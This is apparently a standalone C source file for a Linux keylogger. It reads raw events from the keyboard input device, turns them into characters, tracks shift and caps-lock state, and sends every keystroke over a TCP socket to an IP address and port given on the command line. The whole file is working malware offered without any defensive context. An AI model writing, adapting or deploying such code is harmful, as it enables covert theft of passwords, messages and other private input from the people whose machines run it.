#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <termios.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/input.h>
#include <string.h>

#include "keyboard.h"

int clearBuffer(char buffer[], int size) {
	for(int i = 0; i < size; i++) {
		buffer[i] = '\0';
	}
}

char* caps(char letter[]) {
    for(int i = 0; i < strlen(letter); i++) {
      if(letter[i] >= 'a' && letter[i] <= 'z') letter[i] += ('A' - 'a');
    }
    return letter;
}


int main(int argc, char* argv[]) {

  char* IP;
  char* PORT;
  int sock;
  int fd;
  int capital = 0;
  struct sockaddr_in sockAddress;
  struct input_event ev;
  int addrlen = sizeof(sockAddress);
  char buffer[1024] = {0};
  char c;
  char* dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
  ssize_t n;

  if(argc < 3) {
    printf("\033[0;33m[ \033[1;35m*\033[0;33m] ] \033[1;31mError! Usage: %s {IP ADDRESS} {PORT}\033[0m \n", argv[0]);
    exit(0);
  } else {
  IP = argv[1];
  PORT = argv[2];
  }

	fd = open(dev, O_RDONLY);
	if (fd == -1) {
		perror("Error opening file");
		exit(EXIT_FAILURE);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	sockAddress.sin_family = AF_INET;
	sockAddress.sin_port = htons(atoi(PORT));
	sockAddress.sin_addr.s_addr = inet_addr(IP);

	if(connect(sock, (struct sockaddr *) &sockAddress, addrlen)) {
		perror("socket");
		return -1;
	}


	 while (1) {
    n = read(fd, &ev, sizeof ev);
    if (n == (ssize_t) -1)
      if (errno == EINTR) continue;
      else break;
    else if (n != sizeof ev) {
        errno = EIO;
        break;
      }

    send(sock, "\033[1;33m", strlen("\033[1;33m"), 0);

    if (ev.type == EV_KEY && (ev.value == 1) || (ev.value == 0)) {    strcat(buffer, translateCode(ev.code, ev.value));
      if(strcmp(buffer, "(SHIFT)") == 0){
        if(capital == 0) {
          capital = 1;
        } else {
          capital = 0;
        }
        clearBuffer(buffer, 1024);
      } else if (strcmp(buffer, "(RELEASE SHIFT)") == 0){
        if(capital == 1) {
          capital = 0;
        } else {
          capital = 1;
        }
        clearBuffer(buffer, 1024);
      } else if (strcmp(buffer, "(CAPS LOCK)") == 0) {
        if(capital == 0) {
          capital = 1;
        } else {
          capital = 0;
        }
        clearBuffer(buffer, 1024);
      }
      if(capital == 0 && strcmp(buffer, "(RELEASE SHIFT)") != 0 && strcmp(buffer, "(SHIFT)") != 0) {
    write(sock, buffer, strlen(buffer));
      clearBuffer(buffer, 1024);
      } else if (capital == 1 && strcmp(buffer, "(SHIFT)") != 0 && strcmp(buffer, "(RELEASE SHIFT)") != 0) {
    write(sock, caps(buffer), strlen(buffer));
    clearBuffer(buffer, 1024);
    }
  }
}

  close(fd);
  return EXIT_FAILURE;

}
